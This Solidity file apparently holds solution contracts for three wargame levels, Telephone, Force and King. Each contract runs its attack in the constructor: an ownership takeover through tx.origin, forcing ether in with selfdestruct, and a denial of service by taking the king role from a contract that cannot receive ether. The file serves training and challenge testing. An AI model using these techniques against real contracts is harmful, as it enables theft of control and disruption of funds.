// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Real exploits for the kept levels. Each runs entirely in its constructor, so one CREATE tx from the player is
// the whole attack (initcode = creationCode ++ abi.encode(args)). Fallback and Delegation need no contract.

interface ITelephone {
    function changeOwner(address _owner) external;
}

/// Telephone: changeOwner only works when tx.origin != msg.sender, i.e. through an intermediate contract.
contract TelephoneAttack {
    constructor(address telephone, address player) {
        ITelephone(telephone).changeOwner(player);
    }
}

/// Force: the level has no receive/fallback; selfdestruct pushes ether in regardless.
contract ForceAttack {
    constructor(address payable force) payable {
        selfdestruct(force);
    }
}

/// King: become king from a contract that cannot receive ether, so the factory's reclaim transfer reverts.
contract KingAttack {
    constructor(address payable king) payable {
        (bool ok,) = king.call{value: msg.value}("");
        require(ok, "not king");
    }
}
